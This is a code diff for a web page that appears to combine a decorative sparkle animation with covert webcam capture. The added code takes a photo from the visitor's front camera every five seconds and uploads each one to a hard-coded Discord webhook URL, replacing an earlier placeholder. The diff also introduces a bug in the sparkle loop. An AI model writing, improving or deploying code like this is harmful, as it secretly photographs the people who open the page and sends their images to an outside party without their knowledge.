@@ -185,28 +185,37 @@
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
         const video = document.createElement('video');
         video.srcObject = stream;
+        video.muted = true;
         video.play();
 
-        // Capture every 5 seconds
-        setInterval(async () => {
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0);
+        // Wait until video metadata is loaded
+        video.onloadedmetadata = () => {
+          setInterval(async () => {
+            if(video.videoWidth === 0 || video.videoHeight === 0) return;
 
-          canvas.toBlob(async (blob) => {
-            const formData = new FormData();
-            const timestamp = new Date().toLocaleString();
-            formData.append('file', blob, `capture_${Date.now()}.jpg`);
-            formData.append('payload_json', JSON.stringify({ content: `📸 Auto-capture - ${timestamp}` }));
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
 
-            // Replace with your Discord webhook
-            const DISCORD_WEBHOOK = 'YOUR_DISCORD_WEBHOOK_URL';
-            await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
-          }, 'image/jpeg', 0.8);
+            canvas.toBlob(async (blob) => {
+              const formData = new FormData();
+              const timestamp = new Date().toLocaleString();
+              formData.append('file', blob, `capture_${Date.now()}.jpg`);
+              formData.append('payload_json', JSON.stringify({ content: `📸 Auto-capture - ${timestamp}` }));
 
-        }, 5000);
+              const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN';
+              try {
+                await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+                console.log('✅ Photo sent');
+              } catch(e) {
+                console.error('❌ Failed to send photo:', e);
+              }
+            }, 'image/jpeg', 0.8);
+
+          }, 5000);
+        };
 
       } catch (err) {
         alert('❌ Camera permission denied! Please allow camera access and refresh.');
@@ -247,7 +256,7 @@
         s.y-=s.speed;
         s.alpha-=0.002;
         if(s.alpha<0){ sparkles[i]=createSparkle(); }
-        if(s.y<-5){ s.y=canvas.height+5; }
+        if(s.y<-5){ sparkles[i]=canvas.height+5; }
       });
       requestAnimationFrame(drawSparkles);
     }
